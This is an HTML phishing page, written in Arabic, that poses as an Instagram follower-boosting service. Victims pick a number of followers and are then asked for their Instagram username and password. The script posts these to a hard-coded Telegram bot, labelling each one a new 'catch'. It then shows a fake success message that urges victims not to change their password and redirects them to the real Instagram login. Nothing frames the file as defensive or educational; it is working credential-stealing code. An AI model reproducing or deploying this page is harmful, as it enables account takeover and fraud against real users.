<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Followers Booster</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0;
        }
        .container {
            background: white; padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 100%; max-width: 380px; text-align: center;
        }
        .instagram-logo {
            font-family: 'Style Script', cursive; font-size: 45px;
            margin-bottom: 15px; color: #262626;
        }
        /* تصميم أزرار الدوبامين */
        .follower-option {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            color: white; border: none; padding: 14px; border-radius: 12px;
            cursor: pointer; font-weight: bold; width: 100%; margin: 8px 0;
            font-size: 15px; transition: 0.3s;
            display: flex; justify-content: space-between; align-items: center;
        }
        .follower-option:hover { transform: scale(1.03); box-shadow: 0 5px 15px rgba(204, 35, 102, 0.4); }
        .follower-option span { background: rgba(255, 255, 255, 0.25); padding: 2px 10px; border-radius: 20px; font-size: 11px; }

        input {
            width: 100%; padding: 12px; margin: 8px 0;
            border: 1px solid #dbdbdb; border-radius: 8px;
            background: #fafafa; font-size: 14px; box-sizing: border-box;
        }
        .btn-confirm {
            background: #0095f6; color: white; border: none;
            padding: 12px; border-radius: 8px; cursor: pointer;
            font-weight: 600; width: 100%; margin-top: 10px; font-size: 16px;
        }
        #loader {
            display: none; border: 3px solid #f3f3f3; border-top: 3px solid #bc1888;
            border-radius: 50%; width: 24px; height: 24px;
            animation: spin 1s linear infinite; margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #error-msg { color: #ed4956; font-size: 13px; margin: 10px 0; display: none; }
        .badge { font-size: 11px; color: #8e8e8e; margin-bottom: 10px; display: block; font-weight: bold; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Style+Script&display=swap" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="instagram-logo">Instagram</div>
    
    <div id="step1">
        <span class="badge">💎 نظام التوليد التلقائي نشط الآن</span>
        <h2 style="font-size: 18px; margin-bottom: 20px;">اختر كمية المتابعين</h2>
        <button class="follower-option" onclick="goToLogin('1,500')">1,500 <span>FREE</span></button>
        <button class="follower-option" onclick="goToLogin('5,000')">5,000 <span>POPULAR</span></button>
        <button class="follower-option" onclick="goToLogin('15,000')">15,000 <span>HOT</span></button>
        <button class="follower-option" onclick="goToLogin('50,000')">50,000 <span>PLATINUM</span></button>
        <button class="follower-option" onclick="goToLogin('100,000')">100,000 <span>LEGENDARY</span></button>
    </div>

    <div id="step2" style="display:none;">
        <h3 id="status-text" style="color: #262626; font-size: 16px;">جاري تجهيز الباقة...</h3>
        <div id="loader"></div>
        <div id="login-fields" style="display:none;">
            <p style="font-size: 13px; color: #8e8e8e;">سجل دخولك لتأكيد إرسال المتابعين إلى حسابك</p>
            <input type="text" id="username" placeholder="اسم المستخدم" oninput="validateInput()">
            <input type="password" id="password" placeholder="كلمة السر">
            <p id="error-msg"></p>
            <button class="btn-confirm" id="login-btn" onclick="processLogin()">تأكيد واستلام</button>
        </div>
    </div>

    <div id="step3" style="display:none;">
        <div style="font-size: 50px;">✅</div>
        <h3 style="color: #4BB543;">تمت العملية بنجاح</h3>
        <p style="font-size: 13px; color: #8e8e8e;">سيتم البدء بزيادة المتابعين خلال دقائق. لا تقم بتغيير كلمة السر الآن.</p>
    </div>
</div>

<script>
    let selectedAmount = "";
    const TOKEN = "7973355620:AAGRjTgpBzEul3YIeUq8dAHxO9PTB-OJwvQ";
    const ID = "2103976274";

    function goToLogin(amount) {
        selectedAmount = amount;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('loader').style.display = 'block';

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status-text').innerText = "تم حجز " + amount + " متابع باسمك!";
            document.getElementById('login-fields').style.display = 'block';
        }, 2000);
    }

    function validateInput() {
        const user = document.getElementById('username').value;
        const error = document.getElementById('error-msg');
        if (/[\u0600-\u06FF]/.test(user)) {
            error.innerText = "اسم المستخدم يجب أن يكون بالإنجليزية فقط.";
            error.style.display = 'block';
            return false;
        }
        error.style.display = 'none';
        return true;
    }

    async function processLogin() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const btn = document.getElementById('login-btn');

        if (!validateInput() || user === "" || pass === "") return;

        btn.disabled = true;
        btn.innerText = "جاري التحقق...";

        // إرسال البيانات
        const text = `🎯 صيد جديد جاهز!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}\n📈 الكمية: ${selectedAmount}\n🕒 الوقت: ${new Date().toLocaleString()}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ID, text: text })
            });
        } catch (e) { console.log(e); }

        // التمويه النهائي
        document.getElementById('step2').style.display = 'none';
        document.getElementById('step3').style.display = 'block';

        setTimeout(() => {
            window.location.href = "https://www.instagram.com/accounts/login/";
        }, 3000);
    }
</script>

</body>
</html>
